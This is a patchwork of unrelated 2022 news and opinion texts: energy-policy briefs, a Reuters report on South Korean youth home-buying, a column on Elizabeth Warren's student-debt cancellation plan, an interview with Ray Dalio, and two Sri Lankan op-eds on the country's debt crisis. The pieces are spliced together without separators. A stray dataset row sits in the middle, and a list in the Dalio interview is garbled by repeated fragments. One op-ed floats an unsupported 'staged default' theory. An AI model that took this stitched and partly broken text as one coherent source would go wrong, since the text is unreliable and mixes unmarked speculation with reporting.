HEATPUMPS FOR HOUSES: The Biden administration is targeting heat pump accessibility, building off of last week's clean energy technology use of the Defense Production Act. The administration will be rolling out new gas furnace energy efficiency standards this week in a bid to lower home heating and cooling costs, and holding meetings between senior White House officials with lawmakers to advance legislation offering tax benefits for heat pumps, including Sen. Amy Klobuchar's HEATR Act (S. 4139 (117)) and Sen. Ed Markey's ICEE HOT Act (S. 4144 (117)), a White House official told ME.

EPA UNION PUSHES BACK ON POLYMET IN COURT: The Midwest chapter of EPA’s biggest union last week told the Minnesota Supreme Court that it should force state regulators to carry out a new notice-and-comment process on permits for the contentious PolyMet copper and nickel mine.

Lower state courts previously found the Minnesota Pollution Control Agency pressured EPA to withhold submitting written versions of its critical comments, which would have been publicly disclosed. But those courts did not find that to be unlawful, and thus haven’t ordered an entirely new public comment process. In an amicus brief last week, AFGE Local 704 argued before the state’s top court that the only way to fix the error is a new notice-and-comment process.

Re-issuing the permit without those steps “is tantamount to claiming that a boxing match is fair if you tie your opponent’s hand behind his back—so long as you admit to the deed after the fact,” the union argued.

ICYMI ON FERC'S RADAR:POLITICO's Catherine Morehouse has the rundown on FERC's open meeting this week, where the commission will dive into rules holding up the queue for more renewable generation to get on the grid and the impact of extreme weather on transmission line performance.



Beyond the Beltway

A CUSTOMER FOR RUSSIA: Sri Lanka may be forced to turn to Russia for oil as it reels under a debt crisis making basic goods including food and fuel scarce, the country’s Prime Minister Ranil Wickremesinghe told the AP. With Europe working to end its Russian oil purchases and China’s frequent Covid lockdowns, Russia has been eagerly seeking open buyers to keep its output afloat.

“If we can get from any other sources, we will get from there. Otherwise (we) may have to go to Russia again,” Wickremesinghe said.

“Sometimes we may not know what oil we are buying,” he added. “Certainly we are looking at the Gulf as our main supply.” Read the full interview here.

When asked last month, Energy Secretary Jennifer Granholm wouldn’t rule out secondary sanctions on buyers of Russian oil in a bid to starve out the country’s cash cow. Doing so could also increase tensions with India and China. Granholm herself was sanctioned by Moscow last week.

President Yoon's vow to ease affordability crisis faces test

Red-hot home prices pressure highly leveraged households

Analysts warn of sharp housing correction, blow to consumption

SEOUL, June 13 (Reuters) - Young South Koreans are buying homes in defiance of sharp rate rises that has once again put the spotlight on a severe housing shortage, complicating President Yoon Suk-yeol's plans to ease a property affordability crisis in Asia's fourth-biggest economy.

Oh Ye-seul, a 26 year-old who works at a start-up firm in Seoul's posh Gangnam district, is the sort of individual who finds little or no sway in Yoon's pledges.

In March, when Yoon swept to power amid anger over his predecessor Moon Jae-in's failures to tame runaway home prices, Oh bought an apartment at a price slightly under 600 million won ($466,236), about half an hour's subway ride from her office.

Such purchases, which an increasing number of young Koreans are pursuing, are being made despite rapid interest rate hikes by the Bank of Korea and suggest the public remain sceptical of Yoon's vow to ease an affordability crisis that has eluded successive administrations. read more

Moreover, it also raises broader economic implications as mortgage rates have spiked to nine-year highs, adding to strains on households saddled with the world's highest debt loads and a global surge in prices for everything from petrol to food to consumer items.

While much of the buying is being fuelled by the fear of missing out on a property due to soaring prices, the risk down the road is of a sharp housing correction, and consumption downturn.

“The continued snapping up of homes by young people is coming at a time when interest rates are rising fast, so consumption could be hit as many will be forced to cut back on their living expenses,"" said Park Sung-woo, an economist at DB Financial Investment.

""South Korea’s household debt is reaching some dangerous levels, and we need to see a slowdown in homebuying and mortgage growth to ease that risk.”

Total debt held by South Korea's households, worth $1.5 trillion or 104% of country's gross domestic product, is higher than any other 35 countries tracked by the Institute of International Finance.

WEALTH CREATOR

For now, though, many young Koreans continue buying property even as the BOK is expected to lift borrowing costs further on top of its 125-bps of rate hikes delivered since August.

Yoon has pledged to relax loan curbs and supplying 2.5 million apartments to ease an acute shortage of property, including loosening loan-to-value (LTV) restrictions from July. read more

But buyers like Oh, who have pushed up the proportion of Seoul home buyers in their 20s and 30s to 43% in April, up for a second month from 36% in February, are not prepared to wait. In Seoul's central districts of Jongno, Gwanak, and Seongdong, more than half of the buyers were from the age group.

Real estate is one of the biggest wealth creators for South Koreans, with 73% of total household assets invested in property as of 2021, government data showed.

Oh considers herself lucky to have secured a mortgage with a state-run lender that offers cheap, fixed-rate loans to first home buyers.

The poor performance of domestic and global stocks, with the local benchmark KOSPI (.KS11) down 15% year-to-date, has also provided an extra incentive for Koreans to invest in a property.

Oh said she wasn't overly worried about a housing correction, adding ""there will be even more demand from first-time buyers for small-sized apartments like my own once borrowing regulations ease.""

In fact, a May BOK survey showed South Koreans remained largely optimistic about property prices for the next 12 months.

Such attitudes to home purchases will be a test for Yoon's government, which is trying to tame a red-hot market where average apartment prices have doubled to more than a million dollars in metropolitan Seoul during Moon's five-year term even as household incomes have failed to keep pace. read more

That has made home ownership unaffordable for many, especially first-home buyers, with data from one of the nation's largest commercial banks KB Bank suggesting it now takes 19 years to buy an average apartment in Seoul for an average wage earner.

For Yoon, the promise to supply millions of apartments is facing practical hurdles, especially as soaring global inflation has sharply lifted construction costs and is slowing down many other planned projects. Moon's administration didn't acknowledge the housing shortage until late in his five-year tenure.

""For President Yoon, it will be tough to restore trust from young people on his policy initiatives, because previous policies caused them to feel left out from property market gains,"" said Lee Da-eun, an analyst at Daishin Securities.

The Philadelphia Inquirer (TNS)

Sen. Elizabeth Warren may have entered politics as a Harvard Law professor, but her case for a massive elimination of up to $50,000 in debt for America’s 45 million student-loan holders is deeply rooted in a different discipline: math.

“It was not just a random number — it was a number to get the most relief to the most people,” the Massachusetts Democrat and 2020 presidential candidate told me in a phone interview Wednesday, racing between votes on a busy day on Capitol Hill.

With her trademark professorial patience and always backed up by the data, Warren made her pitch for a massive assault on America’s $1.75 trillion college debt bomb that would be substantially more than a $10,000-per-person trial balloon floated by Team Biden — but also not the total debt relief backed by some activists.

More:Service, not money, may be best way to solve student-loan debt problem

More:How you could qualify for student loan forgiveness

More:Eliminate interest to ease student debt crisis

Warren said that among the various options, eliminating $50,000 per person brought the best results in reducing one of the worst aspects of the student debt crisis: its role in exacerbating the widening wealth gap in America between whites and African Americans, as the latter has been slammed harder with college loans. The senator said wiping out debt at the $50,000 level cuts the Black-white wealth gap by 27 percentage points — three times the rate if only $10,000-per-borrower is canceled, as some in the Biden administration have advocated.

But Warren also said that with debt relief at a level higher than $50,000, “the numbers become unwound” — meaning, basically, that you pick up too many med school or law school grads who borrowed large amounts knowing they’d make the future income to pay it back relatively painlessly. The goal, she explained, isn’t to forgive the debts of “Wall Street partners or plastic surgeons, who are going to do just fine.”

'Enormous' need: For Warren, who since her White House bid has been a leading voice in Washington for sweeping college debt elimination, the goal isn’t bailing out those doctors and deal-makers, but rather the people who comprise the largest pool of struggling loan recipients: middle-class folks, many of whom don’t have bachelor’s degrees, and many who were enticed to borrow substantially more than they can repay with their current jobs.

“The need to cancel student loan debt is enormous, and it starts with who is carrying this debt,” Warren said. “It’s hard-working middle-class and working-class people who are trying to get an education and weren’t born into the families who can afford to write a check for that.”

Warren was eager to speak to me because the issue of relieving the college debt burden, which has kept many younger adults from buying or renting their own place or even getting married, is rapidly coming to a head. Although all loan repayments have been on hold since the start of the pandemic in early 2020, President Joe Biden — who’d promised at least $10,000 in individual debt relief during his campaign — is expected to make a move by the second half of the summer to eliminate some of the $1.75 trillion debt load.

Last month, administration sources leaked to The Washington Post — but then quickly backed away from — the $10,000-per-person plan that would also be “means tested’ to make sure that a small percentage of the highest earners wouldn’t benefit. Although that plan would completely eliminate the debt of more than 10 million Americans, critics say its roughly $300 billion in overall relief would barely make a dent in the overall problem. With a final decision seemingly still up for grabs, Warren and her allies — including Senate Majority Leader Chuck Schumer and a fellow icon of the left, Sen. Bernie Sanders — are pushing hard for a much bigger number.

Warren’s weapon in this fight is data. She wants more Americans to understand that some 42% of debt holders don’t even have a bachelor’s degree — sometimes because they borrowed for other kinds of career training but often because of the stress of trying to complete a four-year degree in today’s environment. They “tried college but life happened — a pregnancy, or they were already working two jobs and couldn’t hold it together with classes, or their mom got sick (and) they moved to another town,” she explained.

But many among the other 58% who did get college degrees still struggle to earn enough to pay back the large amounts they were are forced to borrow in an era of runaway tuition. That’s especially true, Warren noted, for young people who attended for-profit universities, including the scammiest versions — like Corinthian Colleges, where Biden just wiped out all $5.8 billion in outstanding debt — where students were pressured to take out maximum loans for degrees that had little worth in the job market. Many for-profit schools, Warren said, “have been caught in plain old fraud.”

But misinformation about the nature of the student debt crisis remains rampant. I agree with Warren that most of this bad info is spread by Republicans “because they understand that student debt cancellation is broadly popular.” But I’d add that sometimes the GOP gets an assist from Democrats like Biden, who at a February 2021 town hall lashed out at $50,000-per-student debt relief, claiming it would help “people who have gone to Harvard and Yale and Penn.”

Chasing the dream: Coincidentally, Warren noted in our interview that only 12% of students at Penn are taking out loans — the well-endowed Ivies tend to offer more in direct scholarships — while that figure rises to 51% for state-supported Penn State and a whopping 89% for Lincoln University, a historically Black school. She said these disparities help explain why 6% of white borrowers still owe money after 20 years, but the figure is 95% for Black loan recipients. She dismissed criticism that canceling student debt would disproportionately help the wealthy, noting that labor groups like the AFL-CIO and the Teamsters support her plan.

The reason is clear: Higher education, and the promise of a better life, remains the American Dream for the wide middle class. Indeed, I pressed Warren on what could be done, even with a large-scale debt cancellation this summer, to solve the root problem of lack of college affordability and access — a frequent theme in this column as well as my new book that comes out in August — that caused the current crisis.

The senator argued that the Biden administration should also implement income-based debt repayment going forward, so that paying off future debt is based on how much graduates actually earn, as opposed to the current mismatch between loan amounts and real-world paychecks. But she also argued for what seems to me like the more natural — if politically fraught — solution: that Congress and state legislatures — which sharply cut direct aid to higher education after the 2008 financial crisis — again finance higher learning in the public sector.

“Remember that Congress passed the GI Bill after World War II and the consequence of that was not only good for all the individuals who were able to take advantage of going to college without taking on debt — it was also good for our economy overall,” Warren said. “Most of the post-war boom is attributed to having a whole cohort of better educated people who could take on the jobs of the 20th century, so it’s an investment in our future.”

In other words, as I pressed her on the one change that could make all the difference in modern American life, higher education should be a public good?

Ray Dalio is the founder and co-chief investment officer of Bridgewater, the largest hedge fund in the world. He’s one of the 100 richest people on Earth. He’s also a bestselling author.

I recently sat down with Dalio to talk about his latest book, The Changing World Order, which uses a historical lens to examine why empires rise and fall — and why the US may be showing some signs of decline.

We covered a range of topics about the economy and Dalio’s life, including:

The 3 biggest issues America is facing right now What’s driving the debt crisis The growing wealth gap (and what we should do about it) Thoughts on inflation and an impending recession Investing during times of volatility Whether or not crypto can become a reserve currency Dalio’s worst (and best) failure as an investor Billionaire personality tests How Dalio helped McDonald’s launch chicken nuggets

The conversation below has been edited for clarity, and annotated with additional context where necessary.

***

ZACHARY CROCKETT: We are in a moment where a lot of people, particularly young folks, feel disenchanted with the American dream. You’ve spent a lot of time studying the markets from a historical perspective. What would you say to those of us who haven’t lived through a time quite like this before?

RAY DALIO: There are three [things] that are happening in the US right now:

First, the creation of enormous amounts of debt and the printing of a lot of money. This results in inflation, which takes buying power away from people. Second, internal conflicts. Political conflict between the left and the right, the haves and the have-nots, and people with different values. And third, a great power conflict on a global stage. In 1945, the US had 80% of the world’s gold, and we [accounted for] 50% of the world’s economy. And we had a monopoly on military power. And now that gap has narrowed.

The Hustle

Let’s walk through each of those a little bit more, starting with debt creation. The national debt is now at $30T. It’s up $7T since 2019 alone. How did we get here?

Creating credit stimulates. Whenever you get a bad situation, you get this very heavy dose of credit. But credit produces debt that builds up over a long period of time.

In recent times — first the 2008 recession and now covid — there was a desire to give people a lot of money. So they created a lot of debt as a big stimulation and printed a lot of money to make it easier to pay that debt.

Moving to internal crises, you spend a lot of time discussing class divisiveness in The Changing World Order.

During the pandemic, billionaires saw their wealth surge by 70%, to $2.1T. I think we can probably both agree that capitalism run amok is not good. In your opinion, where does the current version of capitalism fall short?

It falls short in delivering the basic results.

I’m a capitalist. I believe in capitalism. But I think everything’s got to be reformed. The bottom 60% of the population has not had a rise in per-capita income since 1980. There are big opportunity gaps in areas like education.

We’re going to need radical reforms in order to rectify that.

Well, the left wants redistribution. The right wants trickle-down policies. In your opinion, how do we fix these inequities?

I almost don’t care what’s done as long as it’s bipartisan.

The most important thing is that we have to develop a solid middle — a bipartisanship of smart people who can work together across party lines to make the reforms. We can get into a type of civil war if the two extremes are fighting. This has happened repeatedly in history.

A fairer society minimizes these conflicts.

There are smart investments that can be made. Investments in education, for example, and ensuring that no school district falls below a certain level. If you want to look at what countries did well historically, they invested in infrastructure. It’s a good investment.

The Hustle

How about a billionaire tax?

Well, I think that there needs to be a transfer of wealth. Not just a transfer of wealth, but a transfer of education and opportunities.

That’s going to have to come significantly from taxes, and the wealthy can pay for it better. So, I think that’s inevitable that that would and should come.

Now the form of the tax is a different question. How does it work? When you have a wealth tax, that requires you to be able to value all those assets. Some of those assets are not easy to value. They’re illiquid.

Inheritance taxes might be a more effective solution.

In any case, my generation has left the next generation — your generation — with a broken-down infrastructure and a lot of borrowed money. That’s a problem.

You don’t often hear that admitted aloud.

Well, it’s just a fact.

Let’s discuss your third point, which is a shift in the “world order.” You think that China may eventually usurp America as the world’s leading superpower. What indicators is this based on?

It is inevitable that China will be a comparable power. It is likely that it will pass the US, but not certain. It’ll all depend on how much the United States takes care of itself.

China has a population four times that of the US. If its per-capita income was even half that of the US, it would be twice as large economically. I first started going to China in 1984. Since then, its per-capita income has increased by 26 times.

We can’t discount China, and we know that we’re in a different world than in the early years of me growing up when the United States was the dominant power.

We’re going to have a great power conflict. And there are no courts that you go to when you have disagreements; it’s a power conflict. What matters most is power. And so we better get stronger, or expect that we have to deal with that power conflict. Ideally in a way that does not produce a military war.

China has many problems of its own: a population is aging, opaque financial markets, severe internal social and cultural injustices. Do you see these as potential threats to its rise?

China has a number of challenges.

Despite those challenges, it’s likely that they will grow at a faster pace than we will grow at because they are being very productive.

Would it really be that bad to be, say, the third or the fifth most powerful country in the world? What do you lose when you lose that top spot on the throne?

I think that top spot is way exaggerated.

To some extent, you can control things more when you’re in the top spot. But going to war and leading those wars is terribly dangerous. And maintaining that top spot is very costly. The US has bases in 70+ countries.

So yeah, being number one has its own problems.

The Hustle

You have this interesting chart in the book that maps out the major characteristics in the rise and fall of an empire, based on 500 years of historical data. Where do you see the US right now in this cycle?

The Changing World Order (Ray Dalio)

Well, I think we’re relatively late in the cycle.

We’re in the riskier part of the cycle, which is the cycle right before wars. But that doesn’t mean a war is inevitable.

Really, it all comes down to how we are with each other. The world has more resources, more wealth, than it ever had. If we work together to share of the wealth and the opportunities, you can avoid wars.

We’ve heard a lot of prominent voices weigh in on a possible impending recession. Jamie Dimon, the CEO of JPMorgan Chase, recently said a “hurricane” is coming. What are your thoughts on that?

I believe that we will be in a relatively extended period of stagflation.*

We have inflation, which takes buying power away. And the central bank is going to fight it by making credit less available and raising interest rates, which takes even more buying power away.

[*Stagflation: A period in which the inflation rate is high and the economic growth rate slows.]

How do you generally think about moments of volatility, like the one we’re in now, from an investing vantage point?

I would worry about holding assets that are prone to deflate.

When you hold a bond or a money market fund, you’re going to get an interest rate [that] is substantially below the inflation rate, so you’ll lose buying power. Diversify well.

[If I were] to pick countries [for foreign investments], there are three questions I’d ask:

Is the country earning more than it’s spending? Does it have internal order where people are working well with each other to be productive? Is it at risk of being drawn into an international war?

There’s a growing movement to make bitcoin a reserve currency.* Do you see a future there?

I think bitcoin has been a tremendous accomplishment. But I don’t think central banks are going to hold it as a source of reserves.

It’s decentralized, but at the end of the day, governments can still monitor and control it. And the biggest problem with governments is that right now they have their own money problem and you can’t trust them. If bitcoin became too much of a good alternative, they’d get rid of it.

We talk a lot about bitcoin as an alternative, but its total value is relatively small [~$556B, as of publication]. I think too much is being made of it.

[*Reserve currency: A foreign currency that is held in large quantities by central banks for international transactions and investments.]

The Hustle

All right, let’s shift to you now. There were two financial bets that you made that had a huge impact on your career. One was really bad and the other was really good.

The bad: You started Bridgewater in 1975. In 1982, you incorrectly predicted the coming of an economic crisis and you pretty much lost everything. You had to borrow $4k from your dad to pay the bills. What did you take away from that experience?

Oh, it was one of the most painful experiences that happened to me. But also one of the best.

What I took away was a different way of thinking. It gave me a humility that balanced my audacity. It made me ask myself, “How do you know you’re right?” And I developed a principle: Pain + Reflection = Progress.

I learned how to diversify better. I learned how to be more open-minded and [try] to have my ideas stress-tested by other people who disagree with me.

The good: you anticipated the 2008 recession and made your investors a sizable return when almost everyone else was hemorrhaging money. What did you see there that others missed?

I went back and studied history.

I studied the 1929-33 debt bubble and burst,* and I understood it mechanically. What I was seeing in 2007-08 was identical.

It’s a good example of how people can miss out on something because it never happened before in their lifetime. But by studying the past, I was able to anticipate it. Bridgewater made a lot of money when others lost a lot of money because we understood the nature of dynamics.

[*1929-33 bubble and burst: Between 1929 and 1933 (the worst years of the Great Depression), industrial production fell by 47%, GDP dropped by 30%, and unemployment soared to 20%.]

There’s a story about how you helped McDonald’s launch chicken nuggets. You were a commodities trader and an adviser early in your career. In the early ’80s, McDonald’s had this new idea for a product, but there was a problem. And they came to you for help…

I had a large chicken producer as a client, and I had McDonald’s as a client. McDonald’s wanted to come out with the McNugget.

But the problem with the McNugget was if the cost of buying chicken varied a lot, they couldn’t put it on the menu. The price could go up. And they’d have big losses and then they’d either have to change the menu price, which would be a mess, or they would have to take these losses.

I knew the chicken producer. And I knew that the cost of producing a chicken is very small — it’s mostly the corn and soymeal that you feed the chick.

I knew that I could hedge that by being able to buy corn and soymeal futures so that they would lock in a chicken price. So I showed the chicken producer how he could do that and then gave a fixed price to McDonald’s.

You live by kind of a hyperrealist philosophy, in that most things in life are machine-like and conform to some overarching sense of order. What I find interesting about that is that your father was a jazz musician and jazz is all about breaking free from structures.

What role has improvisation played in your life?

Improvisation is an expression of creativity that comes from the subconscious.

I practice transcendental meditation, which brings me into my subconscious. When I align those subconscious thoughts with what is happening in my conscious mind, it helps me make better decisions.

I carry the effects of transcendental meditation through the day. And it gives me that equanimity, that calmness, to be able to approach things in a good way so I don’t get emotionally hijacked.

You’ve met a lot of successful people in your life — heads of state, dignitaries, some of the wealthiest people on earth. Would you say there are any common traits among highly accomplished individuals that you’ve met?

Yes.

I’ve actually done personality testing* on acquaintances and friends, including Elon Musk, Bill Gates, and Reed Hastings.

A few things they have in common:

They’re very, very, very curious , and independent thinkers.

, and independent thinkers. They’re “ full range ” — they’re able to go from the full range of the big picture down to the smallest detail.

” — they’re able to go from the full range of the big picture down to the smallest detail. They’re both systematic and creative . Most people who are creative may not be so systematic, and most people are systematic may not be creative. They tend to be both.

. Most people who are creative may not be so systematic, and most people are systematic may not be creative. They tend to be both. They tend to hold people accountable. They have high standards for other people. Some people would say they’re rude or abrupt.

Most people at the top of their profession made it there because they must be very smart and very capable. Of course, that enters into it. But it’s really how they deal with what they don’t know.

[*You can learn more about Dalio’s personality tests here.]

Are there any life principles that you’ve rethought lately, or that have shifted over time?

The one that comes to mind, again, is Pain + Reflection = Progress.

I lost a son. That was the most painful experience of my life. At 42, he died in an automobile accident. It was the worst thing that ever happened to me.

I reflected quite a bit on death and life, and my relationship with him.

And related to that is the serenity prayer: “Give me the serenity to accept that which I can’t control, give me the power to control that which I can, and give me the wisdom to tell the difference.”

It seems like you’ve spent a large portion of your life trying to wrangle things in and make sense of things that are uncontrollable — markets, relationships, people.

That’s right. And one of the things I’ve learned is that whatever success I’ve had in life has been more due to my knowing how to deal with what I don’t know.

I have a principle: “If you worry, you don’t have to worry. And if you don’t worry, you need to.”",Debt Crisis,2022-06-10 22:04:22

File Photo: Reuters

Sri Lanka is in the throes of an unprecedented economic crisis. Faced with a shortage of foreign exchange and defaulting on its foreign debt repayment, the country is unable to pay for its food, fuel, medicine, and other basic necessities. Notwithstanding the austerities that would be entailed, a bailout by the International Monetary Fund (IMF) has been accepted as the only way out of the dire economic situation.

Opposition political parties and citizens across the country blame the Rajapaksa government's widespread corruption and mismanagement for the crisis, and demand that the president and the parliament resign.

The prime minister, Mahinda Rajapaksa, did so on May 9. However, the protesters at Galle Face Green and elsewhere have not been able to put forward an alternative leadership or a viable road map for the future. The country remains mired in confusion, chaos and a highly volatile political impasse.

To understand the complexity of the current crisis, and to prevent us from falling back into the same paralysing debt cycle, it is necessary to move beyond domestic politics and the relentless news cycles of corporate media, and explore some of the commonly overlooked yet basic global economic and geopolitical dimensions.

Debt crises and global inequality

The transfer of financial and resource wealth from poor countries in the global South to the rich countries in the North is not a new phenomenon. It has been an enduring feature over centuries of both classical and neocolonialism.

At the beginning of 1989, developing nations owed foreign creditors USD 1.3 trillion—that is, ""just over half their combined gross national products and two thirds more than their export earnings.""

Recently, the effects of the war in Ukraine and the Covid-19 crisis have worsened the high debt burdens of developing countries. These countries were already struggling to pay accumulated debts stemming from the expansion of capital flows from the high-income countries to lower income countries after the 2008 global financial crisis. Financial liberalisation was fostered by powerful global interests, including the IMF, when interest rates dropped in the richer countries.

This facilitated borrowing by developing countries from private international capital markets through international sovereign bonds (ISBs), which come with high interest rates and short maturation periods.

Financial liberalisation facilitated by the IMF and the developed countries working with the domestic elites of poor countries have created a ""hierarchical and asymmetrical international financial architecture."" As a December 2021 report published by the Bretton Woods Project points out, this unequal framework creates ""macroeconomic imbalances, financial fragility, and exchange rate instability that can trigger debt and/or currency crises and curb the economic policy autonomy of affected countries to pursue domestic goals.""

The international NGO Jubilee Debt Campaign—also known as Debt Justice—has pointed out that 54 countries are now experiencing a debt crisis. According to the World Bank, Sri Lanka owes USD 15 billion in bonds, mostly dollar-denominated, out of a total of USD 45-50 billion in long-term debt. The country needs USD 7-8.6 billion to service its debt load in 2022, whereas it had just USD 1.6 billion in reserves at the end of March 2022. The downgrading of Sri Lanka by rating agencies such as Moody's added to the difficulty of further borrowing to pay off the debt.

The devaluation of the Sri Lankan rupee by 32 percent since the beginning of the year has made it the ""world's worst performing currency,"" exacerbating the plight of the Sri Lankan people.

The multilateral Asian Development Bank (ADB) and the World Bank owns 13 percent and nine percent of Sri Lanka's foreign debt, respectively. Currently, China is Sri Lanka's largest bilateral lender, owning about 10 percent of its total foreign debt, followed by Japan which also owns 10 percent. Approximately half of Sri Lanka's total foreign debt (55 percent, according to some estimates) is market borrowings through US- and EU-based ISBs. Asset managers BlackRock, Inc and Ashmore Group Plc, along with Fidelity, T Rowe Price and TIAA are among Sri Lanka's main ISB creditors. However, the information on the ownership of ISBs—including one worth USD 1 billion that is maturing on July 25, 2022—is not publicly revealed.

Sri Lanka is in negotiations with the IMF to restructure and repay its massive debt. IMF structural adjustment will include the familiar privatisation, cutbacks of social safety nets and alignment of local economic policy with the US and western interests, to further detriment of local working people's standard of living and inevitably leading to more wealth disparity and repeated debt crises.

Debt crises and geopolitical rivalry

Economic crises create opportunities for external powers to expand economic exploitation and geopolitical control. In Sri Lanka's context, this means India, the US and China.

Sri Lanka's big neighbour India has extended a USD 1 billion credit line to provide essential food and medicine. The Sri Lankan government has stated that there are no conditions attached to the Indian loans. However, Sri Lankan analysts believe that agreements have been made giving Indian companies exclusive access to investments on the island.

Sri Lanka is strategically located in the sea lanes of the Indian Ocean. Over 80 percent of the global seaborne oil trade is estimated to pass through the choke points of the Indian Ocean. Although bizarrely overlooked by the global media, a cold war is already in place between China and the Quadrilateral Alliance (US, Japan, Australia and India) over the control of Sri Lanka and the Indian Ocean.

Sri Lanka is part of China's USD-1-trillion Belt and Road Initiative (BRI), which includes the island's Hambantota Port and Port City. The US, on the other hand, signed an open-ended Acquisition and Cross Services Agreement (ACSA) with Sri Lanka on August 4, 2017, facilitating military logistic support. The US is also seeking to sign a Status of Forces Agreement (SOFA), which would effectively turn Sri Lanka into a US military base. While the proposed US Millennium Challenge Corporation compact has not been signed due to local protests, the pact's objective—US control over the land, transportation and communication infrastructure in Sri Lanka—continues unabated.

In this context of Sri Lanka as a tense theatre of geopolitical rivalry, its debt crisis cannot be understood simply as an economic crisis. Could it, in fact, be a ""staged default"" designed to push Sri Lanka into an IMF bailout, which would complete the island's subservience to the US-dominated economic and political agenda?

Alternative sustainable approaches

The young ""Gota Go Home!"" protesters who demand President Gotabaya Rajapaksa's resignation seem to be unaware of the global dynamics of the Sri Lankan crisis. Perhaps local and foreign interests guiding the protests may want to keep it that way. They are certainly not encouraging the protesters to join global calls for much-needed debt cancellation, debt swaps and regulation of capital market borrowing to prevent debt crises occurring in the first place.

However, at least a few Sri Lankan professionals concerned about the implications of an IMF bailout have put forward alternative short and long-term solutions. They recognise that while exploitative colonial and neocolonial policies have turned Sri Lanka into a poor and desperate country, the island is rich with abundant natural resources and human capital. If the land and ocean and the graphite, ilmenite and other mineral resources are sustainably used, Sri Lanka can be economically self-sufficient and prosperous. There is also much to be learned from Sri Lanka's precolonial history in this regard, not least its hydraulic civilisation.

The Committee on Public Accounts (COPA) has revealed that there are enough fuel and natural gas deposits in the Mannar Basin to meet the entire country's needs for 60 years. If the abundant sustainable solar and wind power are also utilised, Sri Lanka can become not only energy self-sufficient, but an exporter of energy as well.

Bioregionalism, economic democracy, and food and energy sovereignty are the only route to a sustainable future for Sri Lanka and other debt-trapped countries, and indeed the world at large. To overcome the dominant forces seeking to monopolise control over the natural environment and humanity, people—especially the young—need to awaken and work in partnership with each other to fight the destructive greed that ensnares and threatens to destroy us.

As a layman in the subject of political economy, nonetheless interested in discerning the real background to the historic debt crisis that Sri Lanka is undergoing at present, I have been reading many reports, including expert views, opinion statements, institutional press releases, think-tank analyses, COPE reports, etc., that are plentiful on the internet. Based on these readings, I was able to synthesize a layman’s review, which I thought of putting out to a wider readership to stimulate constructive discourses from the more knowledgeable authorities and others alike, especially on the solutions that are available for our country to come out of this huge debt crisis. One of the major criticisms of the general public is that although warnings of this impending disaster had been made repeatedly at official meetings among technocrats and bureaucrats, the general public was not sufficiently alerted early enough, especially via popular media, to shake up the bureaucracy to make a timely course correction.

We all are now aware that Sri Lanka has an accumulated foreign debt of US $ 51 billion at the time of pre-emptive sovereign default of foreign currency repayment which happened in March/April 2022. The following Figure 1, with a series of histograms that appeared on the web, provides a relatively easy understanding of the progression of our cumulated foreign debt over the years since 2000 and its proportional ownership of creditors/lenders. It had been prepared by Reuters in January 2022 sourcing Central Bank information and colour-coded to apportion the foreign debt accumulated since 2000. The proportional ownership has been grouped into several categories of lenders in this chart, such as International Financial Institutions (IDA, ADB, etc. in red), foreign governments (Japan, China, India, etc. in orange), International Sovereign Bond Issuers (Goldman Sachs, Black Rock, and Pacific Investment Management, Vanguard, etc., in green!!) and other capital market lenders (Exim banks, etc., in pale green).

This figure reveals that a higher proportion of foreign funding for Sri Lanka’s development projects as well as to bridge the annual budget deficits in the early 2000 period, came via bilateral and multilateral donor contributions (red and orange color codes), when Sri Lanka was still a Lower Middle-Income Country (LMIC). However, this trend has been changing since 2007 or so, when Sri Lanka started obtaining loans at relatively higher interest rates from International Sovereign Bonds (ISBs) and other Financial Capital Markets. The contribution of ISBs increased significantly from around 2015 and reached an all-time high in 2019 almost at the same time when Sri Lanka was elevated to an Upper Middle-Income category (UMIC) for a short period of time by the World Bank. However, a year later, Sri Lanka was down-graded again as a lower-middle income country after it recorded a US$ 4,020 per capita income for 2020. Apparently, when a country reaches an Upper Middle-Income level, it is not entitled to concessionary loans but must seek funding from International Capital Markets at the internationally prevailing competitive interest rates. Sri Lanka’s access to international capital markets (with International Sovereign Bonds issuances since 2007) brought a shift to commercial borrowing and an increase in external interest rates to be paid back in short periods of time.

Consequently, Sri Lanka’s foreign debt apportioning in 2022, as per Figure 1, which has been computed using information from Sri Lanka’s Central Bank, indicates that over 35% of the island’s debt is owned by US and UK-based ISBs. The balance of foreign debt in 2022 is owned by the aforesaid bi-lateral and multilateral agencies. Some of these latter agencies, usually charge lower interest rates on concessionary terms. They have even gone to the extent of being more compassionate to express their willingness to further delay the debt repayment while at the same time being charitable enough to donate humanitarian aid in the form of food, fuel, and medicine during this crisis period. It is clear that the root cause of Sri Lanka’s default, at this time, is due to the disproportionate accumulation of ISBs and other such financial instruments in recent times. Higher interest rates over short periods of time needed to be paid, for refinancing the loans already taken. (See the graph)

This annual progression of the ‘sovereign debt trap’ also led to the speculation of unsustainability of Sri Lanka’s foreign debt from 2019 onwards leading to a progressive downgrading of credit ratings by the three leading credit rating agencies – Moody’s Investor Services, Standard and Poor’s (S&P), and the Fitch Group. This downgrading by credit rating agencies further deepened Sri Lanka’s debt crisis, pushing us into one of the worst economic crises in modern history.

The Verite Research Strategic Analysis Working Paper published in October 2021provides an analysis on this. For the five years, from 2021 to 2025, the annual average repayments due on servicing external debt maturities is US$ 4,400 million. In contrast, from 2015 to 2018, the government only had to repay an annual average of US$ 2,700 million as external debt repayment. To meet those debt repayments, during 2015 to 2018, the government borrowed on average US$ 1,900 million through ISBs in a year, as indicated in Figure 1. Since the beginning of 2020, the yields of ISBs have more than doubled and the credit ratings of the sovereign bonds were also downgraded multiple times, in 2020, leading to high risks of default in 2021 preventing further borrowing from the international markets. This forced the government to use its already depleting reserves to meet the external debt obligations, while at the same time, meeting the urgent healthcare emergencies resulting from the rapid spread of the COVID 19 pandemic which demanded lockdowns over months, associated economic losses and also for meeting increasing healthcare needs.

While it has been widely reported in the western media that Sri Lanka is a victim of a ‘Chinese debt trap’, our increased dependency on International Sovereign Bonds, over recent times is also equally, if not more, responsible for the default, at this time, as Sri Lanka has been compelled to borrow money from international capital markets at higher rates to be paid back over short periods of time. These funds were needed for the repayment of the loans already taken for the settlement of earlier taken loans/their interests while providing at the same time, the shortfall of social welfare benefits from the lost tax revenue as a result of ill-advised tax rebates granted in 2019. The resultant drop in revenue amounted to 3% of GDP – from 12.6% in 2019 to 9.2% in 2020. The revenue as a share of GDP for 2020 has apparently been the lowest in the post-independence history of Sri Lanka that led to huge deficits which need to be financed through borrowing, resulting in increasing debt.

